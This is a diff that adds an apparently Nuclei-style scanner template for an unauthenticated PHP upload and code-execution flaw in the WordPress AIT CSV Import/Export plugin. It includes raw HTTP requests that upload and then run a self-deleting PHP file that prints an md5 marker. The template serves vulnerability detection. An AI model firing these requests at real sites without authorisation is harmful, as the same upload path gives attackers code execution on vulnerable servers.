@@ -1,0 +1,48 @@
+id: ait-csv-import-export-rce
+
+info:
+  name: WordPress AIT CSV Import Export - Unauthenticated Remote Code Execution
+  author: gy741
+  severity: critical
+  description: |
+    The AIT CSV Import/Export plugin <= 3.0.3 allows unauthenticated remote attackers to upload and execute arbitrary PHP code. The upload-handler does not require authentication, nor validates the uploaded content.
+  reference:
+    - https://wpscan.com/vulnerability/10471
+    - https://github.com/rapid7/metasploit-framework/blob/master//modules/exploits/multi/http/wp_ait_csv_rce.rb
+  classification:
+    cvss-metrics: CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
+    cvss-score: 9.8
+    cwe-id: CWE-434
+  metadata:
+    max-request: 2
+  tags: wp-plugin,rce,fileupload,unauth,wpscan,msf,wordpress,ait-csv,wp,intrusive
+
+variables:
+  string: "ait-csv-import-export-rce"
+
+http:
+  - raw:
+      - |
+        POST /wp-content/plugins/ait-csv-import-export/admin/upload-handler.php HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Content-Type: multipart/form-data; boundary=------------------------ab360007dbae2de8
+
+        --------------------------ab360007dbae2de8
+        Content-Disposition: form-data; name="file"; filename="{{randstr}}.php"
+        Content-Type: application/octet-stream
+
+        sep=;<?php echo md5("{{string}}");unlink(__FILE__);?>
+
+        --------------------------ab360007dbae2de8--
+      - |
+        GET /wp-content/uploads/{{randstr}}.php HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        part: body_2
+        words:
+          - '{{md5(string)}}'
+# digest: 4b0a00483046022100f180c9ab82f0ed66de4ed3a9f19668383defbc05a8039af45a15b4ab81059170022100c5d2f3b67471d667b891ff2f67680c87a60f59d0f656630de522e8fcbc8fd87b:922c64590222798bb761d5b6d8e72950
